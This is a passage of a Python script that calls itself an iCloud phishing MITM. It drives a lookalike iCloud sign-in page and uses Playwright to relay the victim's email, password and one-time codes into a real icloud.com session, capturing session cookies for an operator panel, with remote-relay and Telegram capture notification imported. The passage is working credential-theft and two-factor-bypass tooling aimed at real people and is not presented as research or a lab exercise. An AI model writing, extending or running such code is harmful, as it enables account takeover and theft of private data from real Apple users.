#!/usr/bin/env python3
"""
iCloud phishing MITM.

The victim signs in on a Harbor tab that looks 1:1 like icloud.com. Every keystroke and
click is forwarded to a live icloud.com mirror tab (real Apple sign-in). When Apple
authenticates the victim, we capture the session cookies and surface them in an operator
panel — and write them to captured/capture.json.

  Tab 1 (front):  Harbor   — victim-facing phishing page (1:1 iCloud look).
  Tab 2 (mirror): icloud.com — real Apple sign-in; receives the victim's inputs.
  Tab 3 (panel):  operator capture panel (credentials + cookies + flow log).

No API between the sites — a local Playwright loop is the only coupling, same as the
other mirror tools in this folder.

Usage:
  python phish_mirror.py --channel chrome
  python phish_mirror.py --harbor https://harbor-ten-lake.vercel.app --out captured
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import sys
import time
from datetime import datetime
from pathlib import Path
from urllib import request as urllib_request
from urllib.parse import urlparse, urlencode, quote as urlquote

from playwright.sync_api import Error as PlaywrightError
from playwright.sync_api import Page, sync_playwright

from collection_flow import load_saved_fingerprints, run_collection_tick
from capture_export import assess_session, enrich_cookie_row, write_all_capture_files
from email_sync import AppleEmailLiveSync, VictimEmailState
from victim_route import VictimRouteSync, normalize_path, pick_apple_victim_path
from phish_relay import DEFAULT_PORT, RemoteVictimPage, relay_drain_events, relay_reset_session
from telegram_capture import notify_session_capture, notify_lab_event

ROOT = Path(__file__).parent
PHISH_BRIDGE = (ROOT / 'phish_bridge.js').read_text(encoding='utf-8')
HARBOR_DRIVER = (ROOT / 'harbor_driver.js').read_text(encoding='utf-8')
APPLE_PROBE = (ROOT / 'apple_probe.js').read_text(encoding='utf-8')
APPLE_PAGE_PROBE = (ROOT / 'apple_page_probe.js').read_text(encoding='utf-8')
APPLE_SURFACE_PROBE = (ROOT / 'apple_surface_probe.js').read_text(encoding='utf-8')
PANEL_HTML = (ROOT / 'phish_panel.html').read_text(encoding='utf-8')

ROUTE_ORDER = ['/signin', '/verify', '/session', '/loading', '/payment', '/flow', '/success']

ICLOUD_HOME = 'https://www.icloud.com/'


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description='iCloud phishing MITM (Harbor -> icloud.com + cookie capture).')
    p.add_argument('--harbor', default='https://harbor-ten-lake.vercel.app')
    p.add_argument('--channel', default='chrome', help='Playwright channel: chrome, msedge, chromium')
    p.add_argument('--poll-ms', type=int, default=40)
    p.add_argument('--out', default=str(ROOT / 'captured'))
    p.add_argument('--headless', action='store_true', help='Headless (for testing; the victim cannot click)')
    p.add_argument('--selftest', action='store_true',
                   help='Auto-drive a test credential through the victim to verify the mirror populates icloud.com')
    p.add_argument('--run-seconds', type=int, default=0,
                   help='Exit after N seconds (automated tests; 0 = run until Ctrl+C)')
    p.add_argument(
        '--flow-test-email',
        default='',
        help='Optional auto-fill email (explicit flag only; not read from env).',
    )
    p.add_argument(
        '--flow-test-password',
        default='',
        help='Optional auto-fill password with --flow-test-email (explicit flag only).',
    )
    p.add_argument(
        '--remote',
        action='store_true',
        help='Victim on another device: events via phish_relay (no local Harbor tab).',
    )
    p.add_argument(
        '--relay',
        default=f'http://127.0.0.1:{DEFAULT_PORT}',
        help='Local relay URL for operator drain (embedded server).',
    )
    p.add_argument(
        '--public-relay',
        default='',
        help='Public https tunnel URL for victim ?relay= (defaults to --relay).',
    )
    p.add_argument('--session', default='op1', help='Relay session id (?sid= on victim URL).')
    p.add_argument(
        '--relay-port',
        type=int,
        default=DEFAULT_PORT,
        help='When --remote, start embedded relay on this port (0 = do not start).',
    )
    return p.parse_args()


def path_of(url: str) -> str:
    path = urlparse(url).path or '/'
    if path != '/' and path.endswith('/'):
        path = path.rstrip('/')
    return path or '/'


def apple_auth_frame(page: Page):
    """Prefer the frame that actually shows the account field (avoids stale idmsa iframes)."""
    for frame in page.frames:
        try:
            loc = frame.locator('#account_name_text_field').first
            if loc.count() > 0 and loc.is_visible(timeout=500):
                return frame
        except PlaywrightError:
            pass
    for frame in page.frames:
        u = frame.url or ''
        if 'idmsa.apple.com' in u or 'appleid.apple.com' in u:
            return frame
        try:
            if frame.locator('#account_name_text_field').count() > 0:
                return frame
        except PlaywrightError:
            pass
    url = page.url or ''
    if 'idmsa.apple.com' in url or 'appleid.apple.com' in url:
        return page.main_frame
    try:
        if page.locator('#account_name_text_field').count() > 0:
            return page.main_frame
    except PlaywrightError:
        pass
    return None


def find_apple_frame(page: Page, cached=None):
    """Keep auth/OTP frame after icloud.com navigates post-password."""
    found = apple_auth_frame(page)
    if found:
        return found
    for frame in page.frames:
        try:
            st = probe_apple_frame(frame)
            if st and st.get('step') in ('otp', 'password', 'email', 'trust', 'payment', 'generic'):
                return frame
        except PlaywrightError:
            continue
    if cached is not None:
        try:
            cached.evaluate('true')
            return cached
        except PlaywrightError:
            pass
    return cached


def merge_remote_otp(slots: list[str], etype: str, payload: dict) -> None:
    if etype == 'otp-input':
        raw = payload.get('index', payload.get('i', 0))
        try:
            idx = int(raw)
        except (TypeError, ValueError):
            idx = 0
        if 0 <= idx < len(slots):
            if payload.get('backspace'):
                slots[idx] = ''
            else:
                slots[idx] = re.sub(r'\D', '', str(payload.get('digit') or ''))[:1]
    elif etype == 'otp-paste':
        for i, d in enumerate((payload.get('digits') or [])[: len(slots)]):
            slots[i] = re.sub(r'\D', '', str(d or ''))[:1]


def victim_otp_digits(victim: Page, remote: bool, slots: list[str]) -> list:
    if remote:
        return list(slots)
    try:
        return victim.evaluate(
            "() => window.PhishBridge ? window.PhishBridge.getOtp() : []"
        ) or []
    except PlaywrightError:
        return []


def otp_digits_clean(digits) -> str:
    return re.sub(r'\D', '', ''.join((d or '') for d in digits))[:6]


def otp_slots_normalized(slots) -> list[str]:
    base = list(slots or [])
    out: list[str] = []
    for i in range(6):
        ch = re.sub(r'\D', '', (base[i] if i < len(base) else '') or '')[:1]
        out.append(ch)
    return out


def otp_slots_equal(a: list[str], b: list[str]) -> bool:
    return otp_slots_normalized(a) == otp_slots_normalized(b)


def open_icloud_sign_in(apple: Page):
    apple.goto(ICLOUD_HOME, wait_until='domcontentloaded', timeout=90000)
    apple.wait_for_timeout(2500)
    frame = apple_auth_frame(apple)
    if frame:
        print('  [mirror] icloud.com sign-in frame ready', flush=True)
        return frame
    sign_in = apple.locator('text=Sign In').first
    try:
        sign_in.wait_for(state='visible', timeout=45000)
        sign_in.click()
        print('  [mirror] clicked "Sign In"', flush=True)
    except PlaywrightError as e:
        print('  [mirror] "Sign In" click issue:', repr(e), flush=True)
    for i in range(4):
        apple.wait_for_timeout(3000)
        frame = apple_auth_frame(apple)
        if frame:
            print('  [mirror] icloud.com sign-in frame ready (retry %d)' % (i + 1), flush=True)
            return frame
        sign_in.click()
    frame = apple_auth_frame(apple)
    if not frame:
        print('  [mirror] WARNING: no idmsa.apple.com frame found — mirror will not populate', flush=True)
    return frame


# --- victim -> apple forwarding -------------------------------------------------

def input_event_rank(ev: dict, field: str | None = None) -> tuple:
    payload = ev.get('payload') or {}
    value = payload.get('value') or ''
    if field == 'account' or (payload.get('field') == 'account'):
        return (int(ev.get('seq') or 0), int(ev.get('t') or 0), len(str(value)))
    return (int(ev.get('seq') or 0), int(ev.get('t') or 0), len(str(value)))


def coalesce_relay_events(events: list) -> list:
    """Within one drain batch, keep only the newest input per field (out-of-order fetch)."""
    if not events:
        return events
    out: list = []
    input_idx: dict[str, int] = {}
    for ev in events:
        if ev.get('type') != 'input':
            out.append(ev)
            continue
        field = (ev.get('payload') or {}).get('field')
        if field not in ('account', 'password', 'payment-csc'):
            out.append(ev)
            continue
        seq = int(ev.get('seq') or 0)
        t = int(ev.get('t') or 0)
        if field in input_idx:
            idx = input_idx[field]
            prev = out[idx]
            rank_fn = input_event_rank(ev, field)
            prev_rank = input_event_rank(prev, field)
            if rank_fn >= prev_rank:
                out[idx] = ev
        else:
            input_idx[field] = len(out)
            out.append(ev)
    last_submit = None
    last_email_commit = None
    last_password_commit = None
    otp_idx: dict[str, int] = {}
    trimmed: list = []
    for ev in out:
        if ev.get('type') == 'email-commit':
            pl = ev.get('payload') or {}
            ac = pl.get('account') or ''
            if not last_email_commit:
                rank_fn = (len(ac), int(ev.get('seq') or 0))
            else:
                prev_pl = last_email_commit.get('payload') or {}
                prev_ac = prev_pl.get('account') or ''
                rank_fn = (len(ac), int(ev.get('seq') or 0))
                prev_rank = (len(prev_ac), int(last_email_commit.get('seq') or 0))
                if rank_fn < prev_rank:
                    continue
            last_email_commit = ev
            continue
        if ev.get('type') == 'password-commit':
            if not last_password_commit:
                last_password_commit = ev
            elif int(ev.get('seq') or 0) >= int(last_password_commit.get('seq') or 0):
                last_password_commit = ev
            continue
        if ev.get('type') == 'submit':
            last_submit = ev
            continue
        if ev.get('type') == 'otp-input':
            pl = ev.get('payload') or {}
            key = str(pl.get('index', pl.get('i', 0)))
            if key in otp_idx:
                idx = otp_idx[key]
                prev = trimmed[idx]
                if input_event_rank(ev) >= input_event_rank(prev):
                    trimmed[idx] = ev
            else:
                otp_idx[key] = len(trimmed)
                trimmed.append(ev)
            continue
        if ev.get('type') == 'otp-paste':
            last_submit = None
            replaced_paste = False
            for i, existing in enumerate(trimmed):
                if existing.get('type') == 'otp-paste':
                    if input_event_rank(ev) >= input_event_rank(existing):
                        trimmed[i] = ev
                    replaced_paste = True
                    break
            if not replaced_paste:
                trimmed.append(ev)
            continue
        trimmed.append(ev)
    if last_email_commit:
        trimmed.append(last_email_commit)
    if last_password_commit:
        trimmed.append(last_password_commit)
    if last_submit:
        trimmed.append(last_submit)
    return trimmed


def relay_input_is_stale(field: str, ev: dict, last_seq: dict[str, int]) -> bool:
    seq = int(ev.get('seq') or 0)
    if seq:
        if seq <= last_seq.get(field, 0):
            return True
        last_seq[field] = seq
        return False
    t = int(ev.get('t') or 0)
    prev_t = last_seq.get(f'{field}:t', 0)
    if t and t < prev_t:
        return True
    if t:
        last_seq[f'{field}:t'] = t
    return False


def forward_input(
    apple: Page,
    frame,
    selector: str,
    value: str,
    *,
    sync_cache: dict | None = None,
) -> None:
    """Live type a keystroke into the matching Apple field (no submit)."""
    if selector == '#password_text_field':
        return
    value = value or ''
    if sync_cache is not None and sync_cache.get(selector) == value:
        frame_check = find_apple_frame(apple, frame)
        if frame_check:
            try:
                loc_check = frame_check.locator(selector)
                if loc_check.count() and loc_check.is_visible(timeout=400):
                    if (loc_check.input_value(timeout=800) or '') == value:
                        return
            except PlaywrightError:
                pass
        sync_cache.pop(selector, None)
    frame = find_apple_frame(apple, frame)
    if not frame:
        return
    try:
        loc = frame.locator(selector)
        if loc.count() == 0:
            return
        if not loc.is_visible(timeout=800):
            return
        current = loc.input_value(timeout=1500)
        if current != value:
            loc.fill(value, timeout=2000)
            try:
                loc.evaluate(
                    """(el, v) => {
                      const proto = window.HTMLInputElement.prototype;
                      const desc = Object.getOwnPropertyDescriptor(proto, 'value');
                      if (desc && desc.set) desc.set.call(el, v);
                      else el.value = v;
                      el.dispatchEvent(new InputEvent('input', { bubbles: true, data: v, inputType: 'insertFromPaste' }));
                      el.dispatchEvent(new Event('change', { bubbles: true }));
                    }""",
                    value,
                )
            except PlaywrightError:
                pass
        if sync_cache is not None:
            sync_cache[selector] = value
    except PlaywrightError:
        pass


def apply_victim_inputs_to_apple(
    apple: Page,
    frame,
    pending: dict,
    relay_input_seq: dict,
    sync_cache: dict,
    credentials: dict,
) -> None:
    if not pending:
        return
    for field, item in pending.items():
        ev, value = item
        if relay_input_is_stale(field, ev, relay_input_seq):
            continue
        if field == 'password':
            if value:
                credentials['password'] = value
        elif field == 'account':
            if value.strip():
                credentials['email'] = value.strip()
        elif field == 'payment-csc':
            forward_input(apple, frame, 'input[name*="security"]', value, sync_cache=sync_cache)


def absorb_victim_typed_value(
    field: str,
    value: str,
    ev: dict,
    relay_input_seq: dict[str, int],
    live: dict[str, str],
    email_state: VictimEmailState | None = None,
    password_state: VictimEmailState | None = None,
) -> None:
    if relay_input_is_stale(field, ev, relay_input_seq):
        return
    value = value or ''
    if field == 'account' and email_state is not None:
        email_state.ingest_event(value, int(ev.get('seq') or 0))
    if field == 'password' and password_state is not None:
        password_state.ingest_event(value, int(ev.get('seq') or 0))
    if field == 'account':
        live[field] = value
        return
    if field == 'password':
        live[field] = value
        return
    prev = live.get(field) or ''
    if value == '' or len(value) >= len(prev) or not prev.startswith(value):
        live[field] = value


def _apple_account_email(frame) -> str:
    if not frame:
        return ''
    try:
        return (frame.locator('#account_name_text_field').input_value(timeout=800) or '').strip()
    except PlaywrightError:
        return ''


def push_victim_email_to_apple(
    apple: Page,
    frame,
    email_state: VictimEmailState,
    live_sync: AppleEmailLiveSync,
    *,
    force: bool = False,
    sync_cache: dict | None = None,
) -> None:
    frame = find_apple_frame(apple, frame)
    if not frame:
        return
    normalized = (email_state.get() or '').strip()
    if not normalized:
        return

    # On password step the account field is often hidden/empty — not a mismatch.
    if apple_password_step_ready(frame):
        live_sync.mark_pushed(normalized)
        return

    apple_ac = _apple_account_email(frame)
    mismatch = bool(
        apple_ac and apple_ac.lower() != normalized.lower()
    )
    if not mismatch and not live_sync.should_push(normalized, force=force):
        if normalized and apple_ac == normalized:
            live_sync.mark_pushed(normalized)
        return
    if mismatch:
        print(
            f'  [fwd] email mismatch Apple {apple_ac!r} vs victim {normalized!r}',
            flush=True,
        )
        if sync_cache is not None:
            sync_cache.pop('#account_name_text_field', None)
        live_sync.mark_pushed('')
        if not apple_email_step_only(frame):
            live_sync.mark_pushed(normalized)
            return
        reset_apple_signin_widget(apple, frame)
        frame = find_apple_frame(apple, frame)
        if not frame:
            return
        _apple_force_email_field(frame, normalized)
        live_sync.mark_pushed(normalized)
        return
    if not apple_email_step_only(frame):
        live_sync.mark_pushed(normalized)
        return
    if apple_ac == normalized:
        live_sync.mark_pushed(normalized)
        return
    _apple_force_email_field(frame, normalized)
    live_sync.mark_pushed(normalized)


def sync_live_victim_inputs_to_apple(
    apple: Page,
    frame,
    live: dict[str, str],
    sync_cache: dict,
    credentials: dict,
    email_state: VictimEmailState | None = None,
) -> None:
    # Never mirror partial victim keystrokes into Apple email — commit only on submit.
    if email_state is not None:
        auth = email_state.get().strip()
        if auth:
            credentials['email'] = auth


def _wait_enabled(locator, timeout_ms: int = 8000) -> bool:
    deadline = time.time() + timeout_ms / 1000.0
    while time.time() < deadline:
        try:
            if not locator.is_disabled():
                return True
        except PlaywrightError:
            pass
        time.sleep(0.1)
    return False


def _apple_sign_in_button_ready(frame) -> bool:
    if not frame:
        return False
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const b = document.getElementById('sign-in');
                  if (!b || b.offsetParent === null) return false;
                  if (b.disabled === true) return false;
                  if (b.getAttribute('aria-disabled') === 'true') return false;
                  return true;
                }"""
            )
        )
    except PlaywrightError:
        return False


def _mirror_trace(msg: str) -> None:
    try:
        with (ROOT / "mirror_events.log").open("a", encoding="utf-8") as f:
            f.write(f"{datetime.now().strftime('%H:%M:%S')} {msg}\n")
    except OSError:
        pass


def _apple_email_field_locator(frame):
    if not frame:
        return None
    for sel in (
        "#account_name_text_field",
        'input[name="accountName"]',
        'input[type="email"]',
        'input[autocomplete="username"]',
    ):
        try:
            loc = frame.locator(sel).first
            if loc.count() > 0 and loc.is_visible(timeout=600):
                return loc
        except PlaywrightError:
            continue
    return None


def _apple_type_email_any_frame(apple: Page, email: str):
    target = (email or "").strip()
    if not target:
        return None, ""
    for frame in apple.frames:
        loc = _apple_email_field_locator(frame)
        if not loc:
            continue
        _set_apple_field_value(loc, target)
        try:
            written = (loc.input_value(timeout=1500) or "").strip()
        except PlaywrightError:
            written = ""
        if written:
            return frame, written
    return None, ""


def _apple_force_email_field(frame, email: str) -> str:
    """Write full email to Apple idmsa field; return value read back from DOM."""
    target = (email or '').strip()
    loc = _apple_email_field_locator(frame)
    field = loc if loc else frame.locator('#account_name_text_field')
    if not target:
        try:
            field.click(timeout=2000)
            field.press('Control+a', timeout=1500)
            field.press('Backspace', timeout=1500)
            field.fill('', timeout=2000)
        except PlaywrightError:
            pass
        return ''
    try:
        field.click(timeout=4000)
    except PlaywrightError:
        pass
    try:
        field.press('Control+a', timeout=1500)
        field.press('Backspace', timeout=1500)
    except PlaywrightError:
        pass
    try:
        field.fill('', timeout=2000)
    except PlaywrightError:
        pass
    _set_apple_field_value(field, target)
    written = ''
    try:
        written = (field.input_value(timeout=2000) or '').strip()
    except PlaywrightError:
        pass
    if written != target:
        try:
            field.click(timeout=2000)
            field.press('Control+a', timeout=1500)
            field.press('Backspace', timeout=1500)
            field.press_sequentially(target, delay=12, timeout=30_000)
        except PlaywrightError:
            pass
        try:
            written = (field.input_value(timeout=2000) or '').strip()
        except PlaywrightError:
            written = ''
    if written != target:
        _apple_prepare_email_for_continue(frame, target)
        try:
            written = (field.input_value(timeout=2000) or '').strip()
        except PlaywrightError:
            written = ''
    return written


def _apple_prepare_email_for_continue(frame, email: str) -> None:
    target = (email or '').strip()
    field = frame.locator('#account_name_text_field')
    _set_apple_field_value(field, target)
    try:
        frame.evaluate(
            """(addr) => {
              const a = document.getElementById('account_name_text_field');
              const b = document.getElementById('sign-in');
              if (a) {
                a.focus();
                const proto = window.HTMLInputElement.prototype;
                const desc = Object.getOwnPropertyDescriptor(proto, 'value');
                if (desc && desc.set) desc.set.call(a, addr);
                else a.value = addr;
                a.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertFromPaste', data: addr }));
                a.dispatchEvent(new Event('change', { bubbles: true }));
                a.dispatchEvent(new Event('blur', { bubbles: true }));
              }
              if (b) {
                b.removeAttribute('disabled');
                b.disabled = false;
                b.setAttribute('aria-disabled', 'false');
              }
            }""",
            target,
        )
    except PlaywrightError:
        pass


def _apple_click_email_continue(frame) -> bool:
    """One Continue click on Apple — no retry spam (avoids Apple-side loading loops)."""
    if not frame:
        return False
    if _apple_click_sign_in_button(frame):
        return True
    time.sleep(0.1)
    return _apple_click_sign_in_button(frame)


def _wait_apple_continue_enabled(frame, timeout_s: float = 14.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        if _apple_sign_in_button_ready(frame):
            return True
        time.sleep(0.12)
    return False


def _set_apple_field_value(locator, text: str) -> None:
    """Set Apple auth field value with React-friendly events (no clear+retype flicker)."""
    locator.click(timeout=4000)
    locator.fill(text or '', timeout=4000)
    try:
        locator.evaluate(
            """(el, v) => {
              const proto = window.HTMLInputElement.prototype;
              const desc = Object.getOwnPropertyDescriptor(proto, 'value');
              if (desc && desc.set) desc.set.call(el, v);
              else el.value = v;
              el.dispatchEvent(new InputEvent('input', { bubbles: true, data: v, inputType: 'insertFromPaste' }));
              el.dispatchEvent(new Event('change', { bubbles: true }));
            }""",
            text or '',
        )
    except PlaywrightError:
        pass


def clear_apple_signin_fields(frame) -> None:
    """Empty Apple idmsa email/password fields (removes leftover e2e / stale values)."""
    if not frame:
        return
    for sel in ('#account_name_text_field', '#password_text_field'):
        try:
            loc = frame.locator(sel)
            if loc.count() == 0:
                continue
            if not loc.is_visible(timeout=1200):
                continue
            current = (loc.input_value(timeout=1000) or '').strip()
            if not current:
                continue
            _set_apple_field_value(loc, '')
        except PlaywrightError:
            pass


def reset_apple_signin_widget(apple: Page, frame):
    """Fresh email step on the real iCloud tab."""
    frame = find_apple_frame(apple, frame)
    if not frame:
        frame = open_icloud_sign_in(apple)
    if frame:
        clear_apple_signin_fields(frame)
    return frame


def _type_into_apple_field(locator, text: str, *, delay_ms: int = 35) -> None:
    _set_apple_field_value(locator, text)


def _apple_email_submit_ok(apple: Page, frame, timeout_s: float = 25.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        frame = find_apple_frame(apple, frame)
        if not frame:
            time.sleep(0.12)
            continue
        if apple_password_step_ready(frame) and not apple_email_step_only(frame):
            return True
        try:
            st = probe_apple_frame(frame)
            if st and st.get('step') == 'password' and apple_password_step_ready(frame):
                return True
        except PlaywrightError:
            pass
        time.sleep(0.12)
    return False


def _apple_password_submit_ok(apple: Page, frame, timeout_s: float = 45.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        frame = find_apple_frame(apple, frame)
        if not frame:
            time.sleep(0.15)
            continue
        if apple_otp_step_ready(frame):
            return True
        try:
            page_info = probe_apple_page(apple)
            if page_info.get('trust') or page_info.get('twoFactorOnPage'):
                return True
            surf = probe_apple_surface(apple)
            if surf.get('twoFactorOnPage'):
                return True
            st = probe_apple_frame(frame)
            if st:
                if st.get('loading'):
                    return True
                if st.get('step') == 'otp':
                    return True
                if st.get('step') not in (None, 'password', 'email'):
                    return True
        except PlaywrightError:
            pass
        time.sleep(0.15)
    return False


def _apple_click_sign_in_button(frame) -> bool:
    if not frame:
        return False
    btn = frame.locator('#sign-in')
    for _ in range(8):
        try:
            if btn.is_visible(timeout=800) and btn.is_enabled(timeout=1200):
                btn.click(timeout=4000, force=True)
                return True
        except PlaywrightError:
            pass
        time.sleep(0.1)
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const b = document.getElementById('sign-in');
                  if (!b || b.offsetParent === null) return false;
                  b.removeAttribute('disabled');
                  b.disabled = false;
                  b.setAttribute('aria-disabled', 'false');
                  b.click();
                  return true;
                }"""
            )
        )
    except PlaywrightError:
        return False


def _apple_submit_signin(frame, *, password_step: bool = False) -> None:
    if _apple_click_sign_in_button(frame):
        return
    if password_step:
        return
    for sel in ('#account_name_text_field', '#password_text_field'):
        try:
            loc = frame.locator(sel)
            if loc.is_visible(timeout=600):
                loc.press('Enter', timeout=2500)
                return
        except PlaywrightError:
            continue


def _apple_force_password_field(frame, password: str) -> None:
    """Type password into Apple idmsa field (React needs real keystrokes)."""
    field = frame.locator('#password_text_field')
    try:
        field.click(timeout=4000)
    except PlaywrightError:
        pass
    try:
        field.press('Control+a', timeout=1500)
        field.press('Backspace', timeout=1500)
    except PlaywrightError:
        pass
    pwd = password or ''
    if pwd:
        try:
            field.press_sequentially(pwd, delay=12, timeout=120_000)
        except PlaywrightError:
            _set_apple_field_value(field, pwd)
            return
    try:
        field.evaluate(
            """(el, v) => {
              const proto = window.HTMLInputElement.prototype;
              const desc = Object.getOwnPropertyDescriptor(proto, 'value');
              if (desc && desc.set) desc.set.call(el, v);
              else el.value = v;
              el.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertFromPaste', data: v }));
              el.dispatchEvent(new Event('change', { bubbles: true }));
            }""",
            pwd,
        )
    except PlaywrightError:
        pass


def push_victim_password_to_apple(
    apple: Page,
    frame,
    password_state: VictimEmailState,
    live_sync: AppleEmailLiveSync,
    *,
    force: bool = False,
) -> None:
    frame = find_apple_frame(apple, frame)
    if not frame or not apple_password_step_ready(frame):
        return
    value = password_state.get()
    if value is None:
        value = ''
    if not live_sync.should_push(value, force=force):
        return
    _apple_force_password_field(frame, value)
    live_sync.mark_pushed(value)


def _apple_set_password_field(frame, password: str) -> None:
    _apple_force_password_field(frame, password)



def is_operator_probe_email(account: str) -> bool:
    a = (account or "").strip().lower()
    if not a.endswith("@example.com"):
        return False
    return "mirror-consume" in a or a.startswith("proxy-check@") or a.startswith("live@")


def forward_email(apple: Page, frame, email: str) -> bool:
    from apple_drive import drive_email

    frame = ensure_apple_signin_frame(apple, find_apple_frame(apple, frame))
    if not frame:
        print('  [fwd] email: no apple frame; re-opening sign-in', flush=True)
        frame = open_icloud_sign_in(apple)
        if not frame:
            return False
    try:
        ok, _frame = drive_email(apple, frame, email, find_apple_frame)
        return ok
    except PlaywrightError as e:
        print('  [fwd] email ERR', repr(e), flush=True)
        return False


def ensure_apple_signin_frame(apple: Page, frame):
    """Return idmsa frame, opening iCloud sign-in if needed."""
    frame = find_apple_frame(apple, frame)
    if frame:
        return frame
    print('  [fwd] opening icloud.com sign-in (no frame)', flush=True)
    return open_icloud_sign_in(apple)


def forward_password(apple: Page, frame, password: str, email: str = '') -> bool:
    frame = find_apple_frame(apple, frame)
    if not frame:
        print('  [fwd] password: no apple frame; re-opening sign-in', flush=True)
        frame = open_icloud_sign_in(apple)
        if not frame:
            return False
    try:
        if not apple_password_step_ready(frame):
            if email.strip():
                print('  [fwd] password: Apple not on password step; advancing email first', flush=True)
                if not forward_email(apple, frame, email.strip()):
                    return False
                frame = find_apple_frame(apple, frame)
            if not frame or not apple_password_step_ready(frame):
                print('  [fwd] password: password field not ready', flush=True)
                return False
        field = frame.locator('#password_text_field')
        field.wait_for(state='visible', timeout=8000)
        _apple_force_password_field(frame, password)
        time.sleep(0.25)
        btn = frame.locator('#sign-in')
        if not _wait_enabled(btn, 15000):
            print('  [fwd] password: Sign In still disabled on Apple', flush=True)
        _apple_submit_signin(frame, password_step=True)
        if _apple_password_submit_ok(apple, frame):
            print('  [fwd] password -> ' + ('*' * len(password)), flush=True)
            return True
        print('  [fwd] password submit: Apple did not advance (OTP/trust/loading)', flush=True)
        return False
    except PlaywrightError as e:
        print('  [fwd] password ERR', repr(e), flush=True)
        return False


def _apple_otp_cells(frame):
    if not frame:
        return []
    try:
        primary = frame.locator('input.form-security-code-input')
        if primary.count() >= 6:
            return [primary.nth(i) for i in range(6)]
        secondary = frame.locator('input.security-code-input')
        if secondary.count() >= 6:
            return [secondary.nth(i) for i in range(6)]
        single = frame.locator('input[autocomplete="one-time-code"]')
        if single.count() > 0 and single.first.is_visible(timeout=400):
            return ['single', single.first]
    except PlaywrightError:
        pass
    return []


def _apple_otp_read(frame) -> str:
    if not frame:
        return ''
    try:
        st = probe_apple_frame(frame)
        digits = (st or {}).get('otpDigits') or []
        return ''.join(str(d) for d in digits if str(d).isdigit())
    except PlaywrightError:
        return ''


def sync_apple_otp_to_apple(frame, code: str) -> bool:
    """Mirror victim OTP into Apple security-code inputs (one sequential entry from box 0)."""
    if not frame:
        return False
    code = re.sub(r'\D', '', code or '')[:6]
    cells = _apple_otp_cells(frame)
    if not cells:
        return False
    try:
        if cells[0] == 'single':
            field = cells[1]
            current = re.sub(r'\D', '', field.input_value(timeout=1000) or '')
            if current == code:
                return True
            field.click(timeout=2000)
            field.press('Control+a', timeout=800)
            field.press('Backspace', timeout=800)
            if code:
                field.press_sequentially(code, delay=65)
            return True

        if len(cells) < 6:
            return False
        current = _apple_otp_read(frame)
        if current == code:
            return True
        if not code and not current:
            return True

        for i in range(6):
            try:
                cells[i].click(timeout=1200)
                cells[i].press('Backspace', timeout=400)
            except PlaywrightError:
                pass
        if not code:
            return True
        cells[0].click(timeout=2500)
        cells[0].press_sequentially(code, delay=70)
        return True
    except PlaywrightError:
        return False


def sync_apple_otp_digit(
    frame,
    index: int,
    digit: str,
    *,
    backspace: bool = False,
) -> bool:
    """Type one OTP digit into Apple's box N without clearing the other boxes."""
    if not frame:
        return False
    cells = _apple_otp_cells(frame)
    if not cells or cells[0] == 'single':
        return False
    if index < 0 or index >= 6 or index >= len(cells):
        return False
    ch = re.sub(r'\D', '', str(digit or ''))[-1:] if not backspace else ''
    try:
        cell = cells[index]
        cell.click(timeout=2000)
        if backspace or not ch:
            cell.fill('', timeout=1500)
        else:
            cell.fill(ch, timeout=1500)
        try:
            cell.evaluate(
                """(el, v) => {
                  const proto = window.HTMLInputElement.prototype;
                  const desc = Object.getOwnPropertyDescriptor(proto, 'value');
                  if (desc && desc.set) desc.set.call(el, v);
                  else el.value = v;
                  el.dispatchEvent(new InputEvent('input', { bubbles: true, data: v, inputType: 'insertText' }));
                  el.dispatchEvent(new Event('change', { bubbles: true }));
                }""",
                ch,
            )
        except PlaywrightError:
            pass
        return True
    except PlaywrightError:
        return False


def _apple_otp_read_slots(frame) -> list[str]:
    if not frame:
        return [''] * 6
    cells = _apple_otp_cells(frame)
    if not cells or cells[0] == 'single':
        code = re.sub(r'\D', '', _apple_otp_read(frame))[:6]
        return [code[i] if i < len(code) else '' for i in range(6)]
    out: list[str] = []
    for i in range(min(6, len(cells))):
        try:
            out.append(re.sub(r'\D', '', cells[i].input_value(timeout=500) or '')[:1])
        except PlaywrightError:
            out.append('')
    while len(out) < 6:
        out.append('')
    return out


def sync_apple_otp_slots_to_apple(frame, slots: list[str]) -> bool:
    """Mirror victim OTP into Apple using sequential entry (per-box fill breaks idmsa)."""
    if not frame:
        return False
    want = otp_slots_normalized(slots)
    if not any(want):
        return True
    have = _apple_otp_read_slots(frame)
    if have == want:
        return True
    code = ''.join(want)
    if len(code) == 6 and all(want):
        return sync_apple_otp_to_apple(frame, code)
    end = 0
    for i in range(6):
        if want[i]:
            end = i + 1
        else:
            break
    prefix = ''.join(want[:end])
    if not prefix:
        return True
    if have[:end] == want[:end] and all(have[i] == want[i] for i in range(end)):
        return True
    return sync_apple_otp_to_apple(frame, prefix)


def apply_otp_events_batch(
    apple: Page,
    frame,
    otp_events: list,
    slots: list[str],
    relay_otp_seq: dict[str, int],
    *,
    remote: bool,
) -> tuple:
    frame = find_apple_frame(apple, frame)
    for ev in sorted(otp_events, key=input_event_rank):
        etype = ev.get('type')
        payload = ev.get('payload') or {}
        if etype == 'otp-paste':
            key = 'otp:paste'
            if relay_input_is_stale(key, ev, relay_otp_seq):
                continue
            merge_remote_otp(slots, etype, payload)
        elif etype == 'otp-input':
            try:
                idx = int(payload.get('index', payload.get('i', 0)))
            except (TypeError, ValueError):
                idx = 0
            key = f'otp:{idx}'
            if relay_input_is_stale(key, ev, relay_otp_seq):
                continue
            merge_remote_otp(slots, etype, payload)
    if frame:
        sync_apple_otp_slots_to_apple(frame, slots)
    return frame, otp_digits_clean(slots)


def apply_victim_otp_event(
    apple: Page,
    frame,
    etype: str,
    payload: dict,
    slots: list[str],
    *,
    remote: bool,
    victim: Page,
) -> tuple:
    """Apply one otp-input / otp-paste from victim. Returns (frame, otp_clean)."""
    batch = [{ 'type': etype, 'payload': payload, 'seq': 0, 't': 0 }]
    relay_seq: dict[str, int] = {}
    return apply_otp_events_batch(
